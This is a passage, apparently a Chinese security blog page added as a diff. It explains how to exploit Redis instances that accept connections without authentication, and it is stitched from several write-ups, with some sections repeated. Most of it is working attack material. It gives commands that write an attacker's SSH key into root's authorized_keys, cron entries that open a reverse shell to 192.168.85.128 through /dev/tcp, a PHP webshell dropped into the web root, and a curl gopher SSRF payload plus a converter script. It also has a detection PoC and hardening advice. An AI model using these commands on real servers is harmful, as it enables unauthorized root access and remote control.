@@ -1,0 +1,523 @@
+I"�_<p>https://github.com/knownsec/pocsuite</p>
+
+<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p>
+
+<p>漏洞描述
+部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是 Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问 Redis 服务并进行相关操作。</p>
+
+<p>利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。
+<!-- more -->
+二、漏洞利用
+首先在本地生产公私钥文件：
+$ ssh-keygen –t rsa</p>
+
+<p>然后将公钥写入 foo.txt 文件
+$ (echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; foo.txt</p>
+
+<p>连接 Redis 写入文件
+$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+$ redis-cli -h 192.168.1.11
+$ 192.168.1.11:6379&gt; config set dir /root/.ssh/
+OK
+$ 192.168.1.11:6379&gt; config get dir
+1) “dir”
+2) “/root/.ssh”
+$ 192.168.1.11:6379&gt; config set dbfilename “authorized_keys”
+OK
+$ 192.168.1.11:6379&gt; save
+OK</p>
+
+<p>这里讲解下，这里设定了 crackit 的键值为公钥，并通过 redis 命令变更 Redis DB 文件及存放地点为默认 root 用户 SSH key 存放文件，并将键值重定向追加到远程文件 authorized_keys 的末尾，也就上传了公钥。</p>
+
+<p>这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：
+$ ssh –i  id_rsa root@192.168.1.11</p>
+
+<p>可远程利用自己的私钥登录该服务器。</p>
+
+<p>刚刚我们提到公钥登录和 Redis 持久化存放数据操作，这里简单讲下原理</p>
+
+<p>详细讲解 ssh 登录–公钥登录
+SSH 提供了公钥登录，可以省去输入密码的步骤。</p>
+
+<p>所谓” 公钥登录”，原理很简单，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录 shell，不再要求密码。</p>
+
+<p>这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用 ssh-keygen 生成一个：
+$ ssh-keygen</p>
+
+<p>运行上面的命令以后，系统会出现一系列提示，可以一路回车。其中有一个问题是，要不要对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。</p>
+
+<p>运行结束以后，在 $HOME/.ssh/目录下，会新生成两个文件：id_rsa.pub 和 id_rsa。前者是你的公钥，后者是你的私钥。</p>
+
+<p>通常这时再输入下面的命令，将公钥传送到远程主机 host 上面：
+$ ssh-copy-id user@host</p>
+
+<p>authorized_keys 文件，远程主机将用户的公钥，保存在登录后的用户主目录的 $HOME/.ssh/authorized_keys 文件中。公钥就是一段字符串，只要把它追加在 authorized_keys 文件的末尾就行了。</p>
+
+<p>详细相关的 Redis 持久化命令
+Redis 支持 2 种持久化策略：snapshot 方式和 commandlog 方式，前者通过将当前内存数据快照周期性写入 RDB 文件来实现；后者通过在 log 中记录 Redis 进程收到的写操作来实现，下次 Redis 重启时，回放 commandlog 来恢复数据状态。
+这里使用 RDB 文件写入 SSH key 文件，需要设置以下两个 RDB 相关配置</p>
+
+<p>dbfilename</p>
+
+<p>指定 RDB 文件名，默认为 dump.rdb</p>
+
+<p>dir</p>
+
+<p>指定 RDB 文件存放目录的路径，若包含多级路径，则相关父路径需事先 mkdir 出来，否则启动失败。</p>
+
+<p>set(key, value)：给数据库中名称为 key 的 string 赋予值 value</p>
+
+<p>最后 Client 使用 save 命令通知 redis 做一次快照持久化</p>
+
+<p>修复建议/安全建议</p>
+<ol>
+  <li>禁止一些高危命令
+修改 redis.conf 文件，添加
+rename-command FLUSHALL “”
+rename-command CONFIG   “”
+rename-command EVAL     “”</li>
+</ol>
+
+<p>来禁用远程修改 DB 文件地址</p>
+
+<ol>
+  <li>
+    <p>以低权限运行 Redis 服务
+为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆
+$ groupadd -r redis &amp;&amp; useradd -r -g redis redis</p>
+  </li>
+  <li>
+    <p>为 Redis 添加密码验证
+修改 redis.conf 文件，添加</p>
+  </li>
+</ol>
+
+<p>requirepass mypassword</p>
+
+<ol>
+  <li>
+    <p>禁止外网访问 Redis
+修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用
+bind 127.0.0.1</p>
+  </li>
+  <li>
+    <p>保证 authorized_keys 文件的安全
+为了保证安全，您应该阻止其他用户添加新的公钥。</p>
+  </li>
+</ol>
+
+<p>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：
+$ chmod 400 ~/.ssh/authorized_keys</p>
+
+<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：</p>
+<h1 id="chattr-i-sshauthorized_keys">chattr +i ~/.ssh/authorized_keys</h1>
+
+<p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：</p>
+<h1 id="chattr-i-ssh">chattr +i ~/.ssh</h1>
+
+<p>注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p>
+
+<p>0x00 危害
+信息泄露</p>
+
+<p>系统信息
+redis保存的信息
+GetShell</p>
+
+<p>在Web目录中写入webshell
+写入SSH公钥直接连接
+写入计划任务(corntab)反弹shell</p>
+
+<p>0x02 信息泄露
+数据泄露
+获取所有的key值 keys *</p>
+
+<p>系统信息泄露
+info 命令</p>
+
+<p>可以看到redis的版本、系统内核版本、配置文件路径等信息</p>
+
+<p>0x03 GetShell
+在Web目录中写入webshell
+前提条件</p>
+
+<p>已知网站目录的绝对路径，并且具有读写权限
+写入SSH公钥直接连接
+本地生成公钥和私钥
+将公钥写入到目标的.ssh文件夹
+ssh 连接</p>
+
+<p>写入ssh-keygen公钥
+现在下先在本地生成一对密钥
+kingkk@ubuntu:~/.ssh$ ssh-keygen -t rsa
+这样就可以在~/.ssh目录下生成一对id_rsa、id_rsa.pub</p>
+
+<p>然后连接靶机redis
+kingkk@ubuntu:~/test/redis$ redis-cli -h 192.168.85.132           # 连接靶机
+192.168.85.132:6379&gt; config set dir /root/.ssh                    # 设置本地存储文件目录
+OK
+192.168.85.132:6379&gt; config set dbfilename authorized_keys        # 设置本地存储文件名
+OK
+192.168.85.132:6379&gt; set x “\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjFdA5iENqT7mVAv3kopJZi0jtaDbXq2VwX7AM4Gk8wkAgBjnNGuxP0Tt5Sz0sQY1brgP7pmtTCeXUhPS33qK9RWXHNNuAAnns3c5nTtEuKvZtE+5aFDiVvyjDBhvR9YfzQFc+MgCDNedF6Fe+tzSPxDvqk5hGUoqEgwQS0NQNEIN93qN/qEiCXrUMacy6JS6fa2AC99JO+0LdVB0yMPgW2neJZSoJOYdFdJiW4XSn94aUf/mHmZQbT2VxNHv1nEspyhssTaNzDrBAE60hL91Q+CEO2ir2sSZ95xwJXJQJbeD1HyyiAhwg/ajoBafT45Ae5BjY+cH9a8gCpzXu8Tp7 kingkk@ubuntu\n\n\n”                                  		                           # 设置一个值为id_rsa.pub公钥值
+OK
+192.168.85.132:6379&gt; save                                         # 存储数据
+OK
+这样，我们就把公钥写入对方的服务器了，直接用生成的私钥连接即可
+kingkk@ubuntu:~/.ssh$ ssh -i id_rsa root@192.168.85.132
+Last login: Sun Mar 11 03:50:15 2018 from 172.22.224.117
+[root@localhost ~]# id
+uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+You have new mail in /var/spool/mail/root</p>
+
+<p>假如报了如下错误
+sign_and_send_pubkey: signing failed: agent refused operation
+运行下如下两句即可
+eval “$(ssh-agent -s)”
+ssh-add
+利用计划任务反弹shell
+先开一个终端监听本地的23333端口
+nc -nlvp 23333
+利用之前类似的文件写入，写入定时命令
+192.168.85.132:6379&gt; set x “\n* * * * * /bin/bash -i &gt; /dev/tcp/192.168.85.128/23333 0&lt;&amp;1 2&gt;&amp;1\n”
+OK
+192.168.85.132:6379&gt; config set dir /var/spool/cron/
+OK
+192.168.85.132:6379&gt; config set dbfilename root
+OK
+192.168.85.132:6379&gt; save
+OK
+需要等待一会，一般一分钟之内吧，nc就能收到反弹回来的shell了</p>
+
+<p>写入webshell
+当redis权限较低，上面两种方法都行不通的时候，可以尝试往web服务中写入一句话，获取webshell
+192.168.85.132:6379&gt; set x “&lt;?php phpinfo();?&gt;”
+OK
+192.168.85.132:6379&gt; config set dir /var/www/html
+OK
+192.168.85.132:6379&gt; config set dbfilename shell.php
+OK
+192.168.85.132:6379&gt; save
+OK
+这样，就能在根目录下生成shell.php。访问一下</p>
+
+<p>结合SSRF
+之前能看到，默认情况下虽然是没有密码，但是会开启protected保护模式</p>
+
+<p>在这情况下，我们尝试连接一下对方redis
+kingkk@ubuntu:~/test/redis$ redis-cli -h 192.168.85.132
+192.168.85.132:6379&gt; info
+DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface. If you want to connect from external computers to Redis you may adopt one of the following solutions: 1) Just disable protected mode sending the command ‘CONFIG SET protected-mode no’ from the loopback interface by connecting to Redis from the same host the server is running, however MAKE SURE Redis is not publicly accessible from internet if you do so. Use CONFIG REWRITE to make this change permanent. 2) Alternatively you can just disable the protected mode by editing the Redis configuration file, and setting the protected mode option to ‘no’, and then restarting the server. 3) If you started the server manually just for testing, restart it with the ‘–protected-mode no’ option. 4) Setup a bind address or an authentication password. NOTE: You only need to do one of the above things in order for the server to start accepting connections from the outside.</p>
+
+<p>可以看到保护模式拒绝了redis的远程连接，所以经常redis都是配合着ssrf这个可以伪造身份的攻击方式一起进行攻击</p>
+
+<p>gopher协议
+Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。 Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p>
+
+<p>可以利用gopher协议传输redis的数据报文，达到类似之前对redis的连接、设置、存储操作</p>
+
+<p>抓取数据报文
+在靶机中利用socat抓取发往redis的数据报文</p>
+
+<p>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379
+在攻击机中连接靶机的4444端口，重新发送攻击payload</p>
+
+<p>这里先将要执行的命令写入了shell.sh中，方便一次性执行完毕
+echo -e “\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n”|redis-cli -h $1 -p $2 -x set 1
+redis-cli -h $1 -p $2 config set dir /var/spool/cron/
+redis-cli -h $1 -p $2 config set dbfilename root
+redis-cli -h $1 -p $2 save
+redis-cli -h $1 -p $2 quit
+然后在把靶机中执行</p>
+
+<p>./shell.sh 192.168.85.132 4444
+返回五个OK就表示执行成功了</p>
+
+<p>利用gopher进行攻击
+然后将数据转换成gopher协议的格式
+#coding: utf-8
+import sys</p>
+
+<p>exp = ‘’</p>
+
+<p>with open(sys.argv[1]) as f:
+    for line in f.readlines():
+        if line[0] in ‘&gt;&lt;+’:
+            continue
+        elif line[-3:-1] == r’\r’:
+            if len(line) == 3:
+                exp = exp + ‘%0a%0d%0a’
+            else:
+                line = line.replace(r’\r’, ‘%0d%0a’)
+                line = line.replace(‘\n’, ‘’)
+                exp = exp + line
+        elif line == ‘\x0a’:
+            exp = exp + ‘%0a’
+        else:
+            line = line.replace(‘\n’, ‘’)
+            exp = exp + line
+print exp</p>
+
+<p>然后在本地先监听23333端口</p>
+
+<p>再利用curl发送payload
+curl -v ‘gopher://192.168.85.132:6379/_<em>3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$67%0d%0a-e %0a%0a</em>/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.85.128/23333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a<em>1%0d%0a$4%0d%0asave%0d%0a</em>1%0d%0a$4%0d%0aquit%0d%0a’
+等待一会，就能看到nc接到了反弹回来的shell</p>
+
+<p>在php中的ssrf的话需要安装gopher协议拓展，就可以达到一样的效果。</p>
+
+<p>自动化利用
+我将之前的三种利用方式都写成了.sh的脚本形式，方便使用,只需本地要提前安装好redis</p>
+
+<p>https://github.com/kingkaki/Exploit-scripts/tree/master/redis 还包含了socat捕获的流量报文样例</p>
+
+<p>https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/</p>
+
+<p>解决redis写公钥依然无法登录的情况
+有些朋友在利用Redis写公钥依然无法空密码登录，为什么呢？
+解决方法</p>
+
+<p>A、将自己的公钥通过以上方法生成authrized_keys，然后通过本地形式(本机测试本机方式)，ssh localhost 方式尝试登录，如果能正常登录，则表示授权的KEY没有任何问题</p>
+
+<p>B、被渗透的服务器上授权key的权限问题应该为600
+利用Linux任务计划来设置授权的authorized_keys权限为600。
+echo -e “\n\n*/1 * * * * /bin/chmod 600 ~/.ssh/authorized_keys\n\n”|redis-cli -h 127.0.0.1 -x set 1
+redis-cli -h 127.0.0.1 config set dir /var/spool/cron/
+redis-cli -h 127.0.0.1 config set dbfilename root
+redis-cli -h 127.0.0.1 save</p>
+
+<p>释义：上面这段其实也是保存redis数据的一个过程，不过这个过程是将数据保存为admin，存放在/var /spool/cron下，这个是专门存放任务计划的，而Key 1的值的含义则是：设置任务计划一分钟后执行chmod 600修改authorized_keys的权限为600</p>
+
+<p>C、服务器没有.ssh目录的问题</p>
+
+<p>利用Linux任务计划来创建该文件夹
+echo -e “\n\n*/1 * * * * /bin/make ~/.ssh \n\n”|redis-cli -h 127.0.0.1 -x set 2
+redis-cli -h 127.0.0.1 config set dir /var/spool/cron/
+redis-cli -h 127.0.0.1 config set dbfilename root
+redis-cli -h 127.0.0.1 save</p>
+
+<p>D、.ssh目录权限问题</p>
+
+<p>利用Linux任务计划来设置.ssh目录的权限问题
+echo -e “\n\n*/1 * * * * /bin/chmod 700 /home/root/.ssh/\n\n”|redis-cli -h 127.0.0.1 -x set 1
+redis-cli -h 127.0.0.1 config set dir /var/spool/cron/
+redis-cli -h 127.0.0.1 config set dbfilename root
+redis-cli -h 127.0.0.1 save</p>
+
+<p>一、漏洞概述
+Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p>
+
+<p>1、漏洞描述
+Redis 安全模型的观念是: “请不要将 Redis 暴露在公开网络中, 因为让不受信任的客户接触到 Redis 是非常危险的” 。</p>
+
+<p>Redis 作者之所以放弃解决未授权访问导致的不安全性是因为, 99.99% 使用 Redis 的场景都是在沙盒化的环境中, 为了0.01%的可能性增加安全规则的同时也增加了复杂性, 虽然这个问题的并不是不能解决的, 但是这在他的设计哲学中仍是不划算的。</p>
+
+<p>因为其他受信任用户需要使用 Redis 或者因为运维人员的疏忽等原因，部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p>
+
+<p>利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。</p>
+
+<p>2、漏洞影响
+Redis 暴露在公网（即绑定在0.0.0.0:6379，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。</p>
+
+<p>通过ZoomEye 的搜索结果显示，有97707在公网可以直接访问的Redis服务。</p>
+
+<p>QQ20151111-0@2x</p>
+
+<p>根据 ZoomEye 的探测，全球无验证可直接利用Redis 分布情况</p>
+
+<p>3、漏洞分析与利用
+首先在本地生产公私钥文件：</p>
+
+<p>$ssh-keygen –t rsa
+1
+$ssh-keygen –t rsa
+ssh-keygen</p>
+
+<p>然后将公钥写入 foo.txt 文件</p>
+
+<p>$ (echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; foo.txt
+1
+$ (echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; foo.txt
+再连接 Redis 写入文件</p>
+
+<p>$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+$ redis-cli -h 192.168.1.11
+$ 192.168.1.11:6379&gt; config set dir /root/.ssh/
+OK
+$ 192.168.1.11:6379&gt; config get dir
+1) “dir”
+2) “/root/.ssh”
+$ 192.168.1.11:6379&gt; config set dbfilename “authorized_keys”
+OK
+$ 192.168.1.11:6379&gt; save
+OK
+$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+$ redis-cli -h 192.168.1.11
+$ 192.168.1.11:6379&gt; config set dir /root/.ssh/
+OK
+$ 192.168.1.11:6379&gt; config get dir
+1) “dir”
+2) “/root/.ssh”
+$ 192.168.1.11:6379&gt; config set dbfilename “authorized_keys”
+OK
+$ 192.168.1.11:6379&gt; save
+OK
+redis_ssh</p>
+
+<p>这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：</p>
+
+<p>$ ssh –i  id_rsa root@192.168.1.11
+1
+$ ssh –i  id_rsa root@192.168.1.11
+即可远程利用自己的私钥登录该服务器。</p>
+
+<p>当然，写入的目录不限于 /root/.ssh 下的authorized_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。</p>
+
+<p>4、Redis 未授权的其他危害与利用
+a）数据库数据泄露
+Redis 作为数据库，保存着各种各样的数据，如果存在未授权访问的情况，将会导致数据的泄露，其中包含保存的用户信息等。</p>
+
+<p>redis_user</p>
+
+<p>b）代码执行
+Redis可以嵌套Lua脚本的特性将会导致代码执行, 危害同其他服务器端的代码执行, 样例如下        一旦攻击者能够在服务器端执行任意代码, 攻击方式将会变得多且复杂, 这是非常危险的.</p>
+
+<p>redis_lua</p>
+
+<p>通过Lua代码攻击者可以调用 redis.sha1hex() 函数，恶意利用 Redis 服务器进行 SHA-1 的破解。</p>
+
+<p>c）敏感信息泄露
+通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫。</p>
+
+<p>redis_info</p>
+
+<p>可以看到泄露了很多 Redis 服务器的信息, 有当前 Redis 版本, 内存运行状态, 服务端个数等等敏感信息。</p>
+
+<p>5、漏洞验证
+可以使用Pocsuite（http://github.com/knownsec/pocsuite）执行以下的代码可以用于测试目标地址是否存在未授权的Redis服务。</p>
+
+<p>#!/usr/bin/env python</p>
+<h1 id="---codingutf-8---">-<em>- coding:utf-8 -</em>-</h1>
+
+<p>import socket
+import urlparse
+from pocsuite.poc import POCBase, Output
+from pocsuite.utils import register</p>
+
+<p>class TestPOC(POCBase):
+    vulID = ‘89339’
+    version = ‘1’
+    author = [‘Anonymous’]
+    vulDate = ‘2015-10-26’
+    createDate = ‘2015-10-26’
+    updateDate = ‘2015-10-26’
+    references = [‘http://sebug.net/vuldb/ssvid-89339’]
+    name = ‘Redis 未授权访问 PoC’
+    appPowerLink = ‘http://redis.io/’
+    appName = ‘Redis’
+    appVersion = ‘All’
+    vulType = ‘Unauthorized access’
+    desc = ‘’’
+        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。
+    ‘’’
+    samples = [’’]</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def _verify(self):
+    result = {}
+    payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
+    s = socket.socket()
+    socket.setdefaulttimeout(10)
+    try:
+        host = urlparse.urlparse(self.url).netloc
+        port = 6379
+        s.connect((host, port))
+        s.send(payload)
+        recvdata = s.recv(1024)
+        if recvdata and 'redis_version' in recvdata:
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = self.url
+            result['VerifyInfo']['Port'] = port
+    except:
+        pass
+    s.close()
+    return self.parse_attack(result)
+
+def _attack(self):
+    return self._verify()
+
+def parse_attack(self, result):
+    output = Output(self)
+    if result:
+        output.success(result)
+    else:
+        output.fail('Internet nothing returned')
+    return output
+</code></pre></div></div>
+
+<p>register(TestPOC)
+#!/usr/bin/env python</p>
+<h1 id="---codingutf-8----1">-<em>- coding:utf-8 -</em>-</h1>
+
+<p>import socket
+import urlparse
+from pocsuite.poc import POCBase, Output
+from pocsuite.utils import register</p>
+
+<p>class TestPOC(POCBase):
+    vulID = ‘89339’
+    version = ‘1’
+    author = [‘Anonymous’]
+    vulDate = ‘2015-10-26’
+    createDate = ‘2015-10-26’
+    updateDate = ‘2015-10-26’
+    references = [‘http://sebug.net/vuldb/ssvid-89339’]
+    name = ‘Redis 未授权访问 PoC’
+    appPowerLink = ‘http://redis.io/’
+    appName = ‘Redis’
+    appVersion = ‘All’
+    vulType = ‘Unauthorized access’
+    desc = ‘’’
+        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。
+    ‘’’
+    samples = [’’]</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def _verify(self):
+    result = {}
+    payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
+    s = socket.socket()
+    socket.setdefaulttimeout(10)
+    try:
+        host = urlparse.urlparse(self.url).netloc
+        port = 6379
+        s.connect((host, port))
+        s.send(payload)
+        recvdata = s.recv(1024)
+        if recvdata and 'redis_version' in recvdata:
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = self.url
+            result['VerifyInfo']['Port'] = port
+    except:
+        pass
+    s.close()
+    return self.parse_attack(result)
+ 
+def _attack(self):
+    return self._verify()
+ 
+def parse_attack(self, result):
+    output = Output(self)
+    if result:
+        output.success(result)
+    else:
+        output.fail('Internet nothing returned')
+    return output
+</code></pre></div></div>
+
+<p>register(TestPOC)
+二、安全建议
+配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口6379
+配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中
+配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度
+好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config</p>
+
+<p>https://help.compose.com/docs/redis-ssh-tunnels</p>
+:ET
